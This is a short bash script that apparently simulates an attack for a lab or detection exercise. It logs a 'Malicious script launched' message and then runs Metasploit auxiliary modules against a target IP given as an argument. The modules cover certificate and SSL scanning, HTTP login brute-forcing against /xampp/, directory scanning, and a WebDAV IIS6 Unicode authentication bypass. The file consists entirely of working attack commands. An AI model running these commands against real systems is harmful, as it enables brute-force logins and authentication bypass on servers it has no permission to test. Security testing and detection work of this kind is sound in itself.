#!/bin/bash
#Reusuable timestamp function
timestamp(){
  date +"%Y-%m-%d %T"
}

echo "$(timestamp) - Malicious script launched"

#Start attacks
echo "$(timestamp) - Start Attack #1{attack_name_placeholder}"

#Variable definition
WP_IP=$1

echo "wp variable -- $WP_IP -- $1"

#check whether or not server certificates are expired.
msfconsole -q -x "use auxiliary/scanner/http/cert; set RHOSTS $WP_IP; run; exit;"

#SSL
#queries a host or range of hosts and pull the SSL certificate information if present.
msfconsole -q -x "use auxiliary/scanner/http/ssl; set RHOSTS $WP_IP; run; exit;"

#http_login
#brute-force login scanner that attempts to authenticate to a system using HTTP authentication.
#To configure the module, set the AUTH_URI setting to the path of the page requesting authentication.
msfconsole -q -x "use auxiliary/scanner/http/http_login; set AUTH_URI /xampp/; set RHOSTS $WP_IP; set VERBOSE false; run; exit;"

#Dir scanner
msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $WP_IP; run; exit;"

#dir_webdav_unicode_bypass
#attempts to bypass the authentication using the WebDAV IIS6 Unicode vulnerability.
msfconsole -q -x "use auxiliary/scanner/http/dir_webdav_unicode_bypass; set RHOSTS $WP_IP; run; exit;"

# Arachni web testing
#/root/Documents/arachni-security-test/bin/arachni "$WP_APP_URL"
